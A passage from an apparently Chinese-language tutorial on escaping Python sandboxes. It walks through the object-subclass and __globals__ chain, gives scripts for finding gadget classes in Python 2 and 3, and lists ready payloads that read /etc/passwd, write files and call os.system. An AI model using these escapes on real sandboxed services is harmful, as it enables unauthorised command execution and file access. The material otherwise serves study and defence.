过滤import的情况可如下Bypassexecfile(\"E:\\Python27\\Lib\\os.py\")system('calc')exec(compile('__import__(\"os\").system(\"calc\")', '&lt;string&gt;', 'exec')) sys模块该模块通过modules()函数引入命令执行模块来实现： 12import syssys.modules['os'].system('calc') 文件操作类file()函数该函数只存在于Python2 12file('/etc/passwd').read()file('test.txt','w').write('xxx') open()函数12open('/etc/passwd').read()open('test.txt','a').write('xxx') codecs模块123import codecscodecs.open('/etc/passwd').read()codecs.open('test.txt', 'w').write('xxx') 获取当前Python环境信息sys模块1234import syssys.versionsys.pathsys.modules 0x03 沙箱逃逸技巧元素链构造过程下面简单过下元素链的构造过程。 由前面知道，我们可以通过如下方式获取object类： 12345678910111213''.__class__.__mro__[2][].__class__.__mro__[1]&#123;&#125;.__class__.__mro__[1]().__class__.__mro__[1][].__class__.__mro__[-1]&#123;&#125;.__class__.__mro__[-1]().__class__.__mro__[-1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0][].__class__.__base__().__class__.__base__&#123;&#125;.__class__.__base__ 然后通过object类的__subclasses__()方法获取所有的子类列表（Python2和Python3获取的子类不同）： 1234567''.__class__.__mro__[2].__subclasses__()[].__class__.__mro__[1].__subclasses__()&#123;&#125;.__class__.__mro__[1].__subclasses__()().__class__.__mro__[1].__subclasses__()&#123;&#125;.__class__.__bases__[0].__subclasses__()().__class__.__bases__[0].__subclasses__()[].__class__.__bases__[0].__subclasses__() 找到重载过的__init__类，例如： 1''.__class__.__mro__[2].__subclasses__()[59].__init__ 在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有__globals__属性。 写个脚本帮我们来筛选出重载过的__init__类的类： 1234l = len(''.__class__.__mro__[2].__subclasses__())for i in range(l): if 'wrapper' not in str(''.__class__.__mro__[2].__subclasses__()[i].__init__): print (i, ''.__class__.__mro__[2].__subclasses__()[i]) 重载过的__init__类的类具有__globals__属性，这里以WarningMessage为例，会返回很多dict类型： 1''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__ 寻找keys中的__builtins__来查看引用，这里同样会返回很多dict类型： 1''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__'] 再在keys中寻找可利用的函数即可，如file()函数为例： 1''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read() 至此，整个元素链调用的构造过程就走了一遍了，下面看看还有哪些可利用的函数。 使用脚本遍历其他逃逸方法Python2的脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172# coding=UTF-8find_modules = &#123;'filecmp': ['os', '__builtins__'], 'heapq': ['__builtins__'], 'code': ['sys', '__builtins__'], 'hotshot': ['__builtins__'], 'distutils': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'random': ['__builtins__'], 'tty': ['sys', '__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'], 'sysconfig': ['os', 'sys', '__builtins__'], 'whichdb': ['os', 'sys', '__builtins__'], 'runpy': ['sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'], 'plat-atheos': ['os', 'sys', '__builtins__'], 'xml': ['__builtins__'], 'sgmllib': ['__builtins__'], 'importlib': ['sys', '__builtins__'], 'UserList': ['__builtins__'], 'tempfile': ['__builtins__'], 'mimify': ['sys', '__builtins__'], 'pprint': ['__builtins__'], 'platform': ['os', 'platform', 'sys', '__builtins__'], 'collections': ['__builtins__'], 'cProfile': ['__builtins__'], 'smtplib': ['__builtins__'], 'compiler': ['__builtins__', 'compile'], 'string': ['__builtins__'], 'SocketServer': ['os', 'sys', '__builtins__'], 'plat-darwin': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'sys', '__builtins__'], 'repr': ['__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'curses': ['__builtins__'], 'antigravity': ['__builtins__'], 'plat-irix6': ['os', 'sys', '__builtins__'], 'plat-freebsd6': ['os', 'sys', '__builtins__'], 'plat-freebsd7': ['os', 'sys', '__builtins__'], 'plat-freebsd4': ['os', 'sys', '__builtins__'], 'plat-freebsd5': ['os', 'sys', '__builtins__'], 'plat-freebsd8': ['os', 'sys', '__builtins__'], 'aifc': ['__builtins__', 'open'], 'sndhdr': ['__builtins__'], 'cookielib': ['__builtins__'], 'ConfigParser': ['__builtins__'], 'httplib': ['os', '__builtins__'], '_MozillaCookieJar': ['sys', '__builtins__'], 'bisect': ['__builtins__'], 'decimal': ['__builtins__'], 'cmd': ['__builtins__'], 'binhex': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'], 'pydoc': ['os', 'sys', '__builtins__'], 'plat-riscos': ['os', 'sys', '__builtins__'], 'token': ['__builtins__'], 'Bastion': ['__builtins__'], 'msilib': ['os', 'sys', '__builtins__'], 'shlex': ['os', 'sys', '__builtins__'], 'quopri': ['__builtins__'], 'multiprocessing': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'], 'dircache': ['os', '__builtins__'], 'asyncore': ['os', 'sys', '__builtins__'], 'pkgutil': ['os', 'sys', '__builtins__'], 'compileall': ['os', 'sys', '__builtins__'], 'SimpleHTTPServer': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'], 'chunk': ['__builtins__'], 'macpath': ['os', '__builtins__'], 'popen2': ['os', 'sys', '__builtins__'], 'mimetypes': ['os', 'sys', '__builtins__'], 'toaiff': ['os', '__builtins__'], 'atexit': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'], 'HTMLParser': ['__builtins__'], 'encodings': ['codecs', '__builtins__'], 'BaseHTTPServer': ['sys', '__builtins__'], 'calendar': ['sys', '__builtins__'], 'mailcap': ['os', '__builtins__'], 'plat-unixware7': ['os', 'sys', '__builtins__'], 'abc': ['__builtins__'], 'plistlib': ['__builtins__'], 'bdb': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'sys', '__builtins__', 'compile'], 'pipes': ['os', '__builtins__'], 'rfc822': ['__builtins__'], 'tarfile': ['os', 'sys', '__builtins__', 'open'], 'struct': ['__builtins__'], 'urllib': ['os', 'sys', '__builtins__'], 'fpformat': ['__builtins__'], 're': ['sys', '__builtins__', 'compile'], 'mutex': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'], 'UserString': ['sys', '__builtins__'], 'new': ['__builtins__'], 'formatter': ['sys', '__builtins__'], 'email': ['sys', '__builtins__'], 'cgi': ['os', 'sys', '__builtins__'], 'ftplib': ['os', 'sys', '__builtins__'], 'plat-linux2': ['os', 'sys', '__builtins__'], 'ast': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'], 'UserDict': ['__builtins__'], 'inspect': ['os', 'sys', '__builtins__'], 'mailbox': ['os', 'sys', '__builtins__'], 'Queue': ['__builtins__'], 'fnmatch': ['__builtins__'], 'ctypes': ['__builtins__'], 'codecs': ['sys', '__builtins__', 'open'], 'getopt': ['os', '__builtins__'], 'md5': ['__builtins__'], 'cgitb': ['os', 'sys', '__builtins__'], 'commands': ['__builtins__'], 'logging': ['os', 'codecs', 'sys', '__builtins__'], 'socket': ['os', 'sys', '__builtins__'], 'plat-irix5': ['os', 'sys', '__builtins__'], 'sre': ['__builtins__', 'compile'], 'ensurepip': ['os', 'sys', '__builtins__'], 'DocXMLRPCServer': ['sys', '__builtins__'], 'traceback': ['sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'wsgiref': ['__builtins__'], 'plat-generic': ['os', 'sys', '__builtins__'], 'weakref': ['__builtins__'], 'ihooks': ['os', 'sys', '__builtins__'], 'telnetlib': ['sys', '__builtins__'], 'doctest': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'], 'dis': ['sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'], 'pdb': ['os', 'sys', '__builtins__'], 'this': ['__builtins__'], 'base64': ['__builtins__'], 'os2emxpath': ['os', '__builtins__'], 'glob': ['os', 'sys', '__builtins__'], 'unittest': ['__builtins__'], 'dummy_thread': ['__builtins__'], 'fileinput': ['os', 'sys', '__builtins__'], '__future__': ['__builtins__'], 'robotparser': ['__builtins__'], 'plat-mac': ['os', 'sys', '__builtins__'], '_threading_local': ['__builtins__'], '_LWPCookieJar': ['sys', '__builtins__'], 'wsgiref.egg-info': ['os', 'sys', '__builtins__'], 'sha': ['__builtins__'], 'sre_constants': ['__builtins__'], 'json': ['__builtins__'], 'Cookie': ['__builtins__'], 'tokenize': ['__builtins__'], 'plat-beos5': ['os', 'sys', '__builtins__'], 'rexec': ['os', 'sys', '__builtins__'], 'lib-tk': ['__builtins__'], 'textwrap': ['__builtins__'], 'fractions': ['__builtins__'], 'sqlite3': ['__builtins__'], 'posixfile': ['__builtins__', 'open'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'xdrlib': ['__builtins__'], 'imghdr': ['__builtins__'], 'macurl2path': ['os', '__builtins__'], '_osx_support': ['os', 'sys', '__builtins__'], 'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'plat-netbsd1': ['os', 'sys', '__builtins__'], 'nturl2path': ['__builtins__'], 'tkinter': ['__builtins__'], 'copy': ['__builtins__'], 'pickletools': ['__builtins__'], 'hashlib': ['__builtins__'], 'anydbm': ['__builtins__', 'open'], 'keyword': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'], 'StringIO': ['__builtins__'], 'modulefinder': ['os', 'sys', '__builtins__'], 'stringprep': ['__builtins__'], 'markupbase': ['__builtins__'], 'colorsys': ['__builtins__'], 'shelve': ['__builtins__', 'open'], 'multifile': ['__builtins__'], 'sre_parse': ['sys', '__builtins__'], 'pickle': ['sys', '__builtins__'], 'plat-os2emx': ['os', 'sys', '__builtins__'], 'mimetools': ['os', 'sys', '__builtins__'], 'audiodev': ['__builtins__'], 'copy_reg': ['__builtins__'], 'sre_compile': ['sys', '__builtins__', 'compile'], 'CGIHTTPServer': ['os', 'sys', '__builtins__'], 'idlelib': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'], 'imputil': ['sys', '__builtins__'], 'bsddb': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'], 'numbers': ['__builtins__'], 'io': ['__builtins__', 'open'], 'plat-sunos5': ['os', 'sys', '__builtins__'], 'symtable': ['__builtins__'], 'pyclbr': ['sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'lib2to3': ['__builtins__'], 'threading': ['__builtins__'], 'dbhash': ['sys', '__builtins__', 'open'], 'gettext': ['os', 'sys', '__builtins__'], 'dumbdbm': ['__builtins__', 'open'], '_weakrefset': ['__builtins__'], '_abcoll': ['sys', '__builtins__'], 'MimeWriter': ['__builtins__'], 'test': ['__builtins__'], 'opcode': ['__builtins__'], 'csv': ['__builtins__'], 'nntplib': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'], 'genericpath': ['os', '__builtins__'], 'stat': ['__builtins__'], '__phello__.foo': ['__builtins__'], 'sched': ['__builtins__'], 'statvfs': ['__builtins__'], 'trace': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'], 'symbol': ['__builtins__'], 'sets': ['__builtins__'], 'htmlentitydefs': ['__builtins__'], 'urllib2': ['os', 'sys', '__builtins__'], 'SimpleXMLRPCServer': ['os', 'sys', '__builtins__'], 'sunaudio': ['__builtins__'], 'pdb.doc': ['os', '__builtins__'], 'asynchat': ['__builtins__'], 'user': ['os', '__builtins__'], 'xmllib': ['__builtins__'], 'codeop': ['__builtins__'], 'plat-next3': ['os', 'sys', '__builtins__'], 'types': ['__builtins__'], 'argparse': ['__builtins__'], 'uuid': ['os', 'sys', '__builtins__'], 'plat-aix4': ['os', 'sys', '__builtins__'], 'plat-aix3': ['os', 'sys', '__builtins__'], 'ssl': ['os', 'sys', '__builtins__'], 'poplib': ['__builtins__'], 'xmlrpclib': ['__builtins__'], 'difflib': ['__builtins__'], 'urlparse': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'], '_strptime': ['__builtins__'], 'htmllib': ['__builtins__'], 'site-packages': ['__builtins__'], 'posixpath': ['os', 'sys', '__builtins__'], 'stringold': ['__builtins__'], 'gzip': ['os', 'sys', '__builtins__', 'open'], 'mhlib': ['os', 'sys', '__builtins__'], 'rlcompleter': ['__builtins__'], 'hmac': ['__builtins__']&#125;target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']all_targets = list(set(find_modules.keys() + target_modules + target_functions))all_modules = list(set(find_modules.keys() + target_modules))subclasses = ().__class__.__bases__[0].__subclasses__()sub_name = [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()print('----------1-----------')for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target)print('----------2-----------')# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')for i, sub in enumerate(subclasses): try: more = sub.__init__.func_globals for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: passprint('----------3-----------')# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").system(\"ls\")')for i, sub in enumerate(subclasses): try: more = sub.__init__.func_globals.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: passprint('----------4-----------')# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")# &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass 运行结果如下： 下面简单归纳下遍历的4种方式： 第一种方式 序号为40，即file()函数，进行文件读取和写入，payload如下： 12''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd').read()''.__class__.__mro__[2].__subclasses__()[40]('E:/test.txt', 'w').write('xxx') 这和前面元素链构造时给出的Demo有点区别： 1''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read() 序号59是WarningMessage类，其具有globals属性，包含builtins，其中含有file()函数，属于第二种方式；而这里是直接在object类的所有子类中直接找到了file()函数的序号为40，直接调用即可。 当然也可以通过调用index()函数的方式来寻找file()函数是否在object类的子类中且序号是多少： 第二种方式 先看序号为59的WarningMessage类有哪些而利用的模块或方法： 1234(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;linecache&apos;, [&apos;os&apos;, &apos;sys&apos;, &apos;__builtins__&apos;])(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;__builtins__&apos;, None)(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;sys&apos;, None)(59, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;types&apos;, [&apos;__builtins__&apos;]) 以linecache中的os为例，这里简单解释下工具的寻找过程依次如下： 1234567891011121314# 确认linecache''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache']# 返回linecache字典中的所有键''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys()# 在linecache字典的所有键中寻找os的序号，找到为12''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.keys().index('os')# 更换keys()为values()，访问12序号的元素，并获取该os字典的所有键''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys()# 在os字典的所有键中寻找system的序号，找到为79''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.keys().index('system')# 执行os.system()''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[79]('calc') payload如下： 123456789101112131415161718# linecache利用''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('calc')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['sys'].modules['os'].system('calc')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['__builtins__']['__import__']('os').system('calc')# __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('calc')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('E:/test.txt', 'w').write('hello')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['execfile']('E:/exp.py')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"calc\")')exec(''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['compile']('__import__(\"os\").system(\"calc\")', '&lt;string&gt;', 'exec'))# sys利用''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('calc')# types利用，后面还是通过__builtins__实现利用''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['types'].__dict__['__builtins__']['__import__']('os').system('calc') 序号为60的catch_warnings类利用payload同上。 序号为61、62的两个类均只有__builtins__可利用，利用payload同上。 序号为72、77的两个类_Printer和Quitter，相比前面的，没见过的有os和traceback，但只有os模块可利用： 12# os利用''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('calc') 序号为78、79的两个类IncrementalEncoder和IncrementalDecoder，相比前面的，没见过的有open： 123# open利用''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('E:/passwd').read()''.__class__.__mro__[2].__subclasses__()[78].__init__.__globals__['open']('E:/test.txt', 'w').write() 第三种方式 先看下序号为59的WarningMessage类： 123456(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;__import__&apos;)(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;file&apos;)(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;compile&apos;)(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;eval&apos;)(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;open&apos;)(59, 13, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &apos;execfile&apos;) 注意是通过values()函数中的数组序号来填写第二个数值实现调用，以下以eval为示例，其他的利用payload和前面的差不多就不再赘述了： 1''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__(\"os\").system(\"calc\")') 其他类似修改即可。 第四种方式 这里只有一种序号，为60： 1234567(60, &apos;__import__&apos;)(60, &apos;file&apos;)(60, &apos;repr&apos;)(60, &apos;compile&apos;)(60, &apos;eval&apos;)(60, &apos;open&apos;)(60, &apos;execfile&apos;) 调用示例如下，其他类似修改即可： 1''.__class__.__mro__[2].__subclasses__()[60]()._module.__builtins__['__import__'](\"os\").system(\"calc\") 前面的脚本是针对Python2的，这里再贴个Python3的脚本，原理一致： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150# coding=UTF-8# Python3find_modules = &#123;'asyncio': ['subprocess', 'sys', '__builtins__'], 'collections': ['__builtins__'], 'concurrent': ['__builtins__'], 'ctypes': ['__builtins__'], 'curses': ['__builtins__'], 'dbm': ['os', 'sys', '__builtins__', 'open'], 'distutils': ['sys', '__builtins__'], 'email': ['__builtins__'], 'encodings': ['codecs', 'sys', '__builtins__'], 'ensurepip': ['os', 'sys', '__builtins__'], 'html': ['__builtins__'], 'http': ['__builtins__'], 'idlelib': ['__builtins__'], 'importlib': ['sys', '__import__', '__builtins__'], 'json': ['codecs', '__builtins__'], 'lib2to3': ['__builtins__'], 'logging': ['os', 'sys', '__builtins__'], 'msilib': ['os', 'sys', '__builtins__'], 'multiprocessing': ['sys', '__builtins__'], 'pydoc_data': ['__builtins__'], 'sqlite3': ['__builtins__'], 'test': ['__builtins__'], 'tkinter': ['sys', '__builtins__'], 'turtledemo': ['__builtins__'], 'unittest': ['__builtins__'], 'urllib': ['__builtins__'], 'venv': ['os', 'subprocess', 'sys', '__builtins__'], 'wsgiref': ['__builtins__'], 'xml': ['__builtins__'], 'xmlrpc': ['__builtins__'], '__future__': ['__builtins__'], '__phello__.foo': ['__builtins__'], '_bootlocale': ['sys', '__builtins__'], '_collections_abc': ['sys', '__builtins__'], '_compat_pickle': ['__builtins__'], '_compression': ['__builtins__'], '_dummy_thread': ['__builtins__'], '_markupbase': ['__builtins__'], '_osx_support': ['os', 'sys', '__builtins__'], '_pydecimal': ['__builtins__'], '_pyio': ['os', 'codecs', 'sys', '__builtins__', 'open'], '_sitebuiltins': ['sys', '__builtins__'], '_strptime': ['__builtins__'], '_threading_local': ['__builtins__'], '_weakrefset': ['__builtins__'], 'abc': ['__builtins__'], 'aifc': ['__builtins__', 'open'], 'antigravity': ['__builtins__'], 'argparse': ['__builtins__'], 'ast': ['__builtins__'], 'asynchat': ['__builtins__'], 'asyncore': ['os', 'sys', '__builtins__'], 'base64': ['__builtins__'], 'bdb': ['os', 'sys', '__builtins__'], 'binhex': ['os', '__builtins__'], 'bisect': ['__builtins__'], 'bz2': ['os', '__builtins__', 'open'], 'cProfile': ['__builtins__'], 'calendar': ['sys', '__builtins__'], 'cgi': ['os', 'sys', '__builtins__'], 'cgitb': ['os', 'sys', '__builtins__'], 'chunk': ['__builtins__'], 'cmd': ['sys', '__builtins__'], 'code': ['sys', '__builtins__'], 'codecs': ['sys', '__builtins__', 'open'], 'codeop': ['__builtins__'], 'colorsys': ['__builtins__'], 'compileall': ['os', 'importlib', 'sys', '__builtins__'], 'configparser': ['os', 'sys', '__builtins__'], 'contextlib': ['sys', '__builtins__'], 'copy': ['__builtins__'], 'copyreg': ['__builtins__'], 'crypt': ['__builtins__'], 'csv': ['__builtins__'], 'datetime': ['__builtins__'], 'decimal': ['__builtins__'], 'difflib': ['__builtins__'], 'dis': ['sys', '__builtins__'], 'doctest': ['os', 'sys', '__builtins__'], 'dummy_threading': ['__builtins__'], 'enum': ['sys', '__builtins__'], 'filecmp': ['os', '__builtins__'], 'fileinput': ['os', 'sys', '__builtins__'], 'fnmatch': ['os', '__builtins__'], 'formatter': ['sys', '__builtins__'], 'fractions': ['sys', '__builtins__'], 'ftplib': ['sys', '__builtins__'], 'functools': ['__builtins__'], 'genericpath': ['os', '__builtins__'], 'getopt': ['os', '__builtins__'], 'getpass': ['os', 'sys', '__builtins__'], 'gettext': ['os', 'sys', '__builtins__'], 'glob': ['os', '__builtins__'], 'gzip': ['os', 'sys', '__builtins__', 'open'], 'hashlib': ['__builtins__'], 'heapq': ['__builtins__'], 'hmac': ['__builtins__'], 'imaplib': ['subprocess', 'sys', '__builtins__'], 'imghdr': ['__builtins__'], 'imp': ['os', 'importlib', 'sys', '__builtins__'], 'inspect': ['os', 'importlib', 'sys', '__builtins__'], 'io': ['__builtins__', 'open'], 'ipaddress': ['__builtins__'], 'keyword': ['__builtins__'], 'linecache': ['os', 'sys', '__builtins__'], 'locale': ['sys', '__builtins__'], 'lzma': ['os', '__builtins__', 'open'], 'macpath': ['os', '__builtins__'], 'macurl2path': ['os', '__builtins__'], 'mailbox': ['os', '__builtins__'], 'mailcap': ['os', '__builtins__'], 'mimetypes': ['os', 'sys', '__builtins__'], 'modulefinder': ['os', 'importlib', 'sys', '__builtins__'], 'netrc': ['os', '__builtins__'], 'nntplib': ['__builtins__'], 'ntpath': ['os', 'sys', '__builtins__'], 'nturl2path': ['__builtins__'], 'numbers': ['__builtins__'], 'opcode': ['__builtins__'], 'operator': ['__builtins__'], 'optparse': ['os', 'sys', '__builtins__'], 'os': ['sys', '__builtins__', 'open'], 'pathlib': ['os', 'sys', '__builtins__'], 'pdb': ['os', 'sys', '__builtins__'], 'pickle': ['codecs', 'sys', '__builtins__'], 'pickletools': ['codecs', 'sys', '__builtins__'], 'pipes': ['os', '__builtins__'], 'pkgutil': ['os', 'importlib', 'sys', '__builtins__'], 'platform': ['os', 'platform', 'subprocess', 'sys', '__builtins__'], 'plistlib': ['os', 'codecs', '__builtins__'], 'poplib': ['__builtins__'], 'posixpath': ['os', 'sys', '__builtins__'], 'pprint': ['__builtins__'], 'profile': ['os', 'sys', '__builtins__'], 'pstats': ['os', 'sys', '__builtins__'], 'pty': ['os', 'sys', '__builtins__'], 'py_compile': ['os', 'importlib', 'sys', '__builtins__', 'compile'], 'pyclbr': ['importlib', 'sys', '__builtins__'], 'pydoc': ['os', 'platform', 'importlib', 'sys', '__builtins__'], 'queue': ['__builtins__'], 'quopri': ['__builtins__'], 'random': ['__builtins__'], 're': ['__builtins__', 'compile'], 'reprlib': ['__builtins__'], 'rlcompleter': ['__builtins__'], 'runpy': ['importlib', 'sys', '__builtins__'], 'sched': ['__builtins__'], 'secrets': ['os', '__builtins__'], 'selectors': ['sys', '__builtins__'], 'shelve': ['__builtins__', 'open'], 'shlex': ['os', 'sys', '__builtins__'], 'shutil': ['os', 'sys', '__builtins__'], 'signal': ['__builtins__'], 'site': ['os', 'sys', '__builtins__'], 'smtpd': ['os', 'sys', '__builtins__'], 'smtplib': ['sys', '__builtins__'], 'sndhdr': ['__builtins__'], 'socket': ['os', 'sys', '__builtins__'], 'socketserver': ['os', 'sys', '__builtins__'], 'sre_compile': ['__builtins__', 'compile'], 'sre_constants': ['__builtins__'], 'sre_parse': ['__builtins__'], 'ssl': ['os', 'sys', '__builtins__'], 'stat': ['__builtins__'], 'statistics': ['__builtins__'], 'string': ['__builtins__'], 'stringprep': ['__builtins__'], 'struct': ['__builtins__'], 'subprocess': ['os', 'sys', '__builtins__'], 'sunau': ['__builtins__', 'open'], 'symbol': ['__builtins__'], 'symtable': ['__builtins__'], 'sysconfig': ['os', 'sys', '__builtins__'], 'tabnanny': ['os', 'sys', '__builtins__'], 'tarfile': ['os', 'sys', '__builtins__', 'open'], 'telnetlib': ['sys', '__builtins__'], 'tempfile': ['__builtins__'], 'textwrap': ['__builtins__'], 'this': ['__builtins__'], 'threading': ['__builtins__'], 'timeit': ['timeit', 'sys', '__builtins__'], 'token': ['__builtins__'], 'tokenize': ['sys', '__builtins__', 'open'], 'trace': ['os', 'sys', '__builtins__'], 'traceback': ['sys', '__builtins__'], 'tracemalloc': ['os', '__builtins__'], 'tty': ['os', '__builtins__'], 'turtle': ['sys', '__builtins__'], 'types': ['__builtins__'], 'typing': ['sys', '__builtins__'], 'uu': ['os', 'sys', '__builtins__'], 'uuid': ['os', 'sys', '__builtins__'], 'warnings': ['sys', '__builtins__'], 'wave': ['sys', '__builtins__', 'open'], 'weakref': ['sys', '__builtins__'], 'webbrowser': ['os', 'subprocess', 'sys', '__builtins__', 'open'], 'xdrlib': ['__builtins__'], 'zipapp': ['os', 'sys', '__builtins__'], 'zipfile': ['os', 'importlib', 'sys', '__builtins__']&#125;target_modules = ['os', 'platform', 'subprocess', 'timeit', 'importlib', 'codecs', 'sys']target_functions = ['__import__', '__builtins__', 'exec', 'eval', 'execfile', 'compile', 'file', 'open']all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))all_modules = list(set(list(find_modules.keys()) + target_modules))subclasses = ().__class__.__bases__[0].__subclasses__()sub_name = [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()print('----------1-----------')for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target)print('----------2-----------')# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__ for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: passprint('----------3-----------')# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__(\"os\").system(\"ls\")')for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: passprint('----------4-----------')# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")# &lt;class 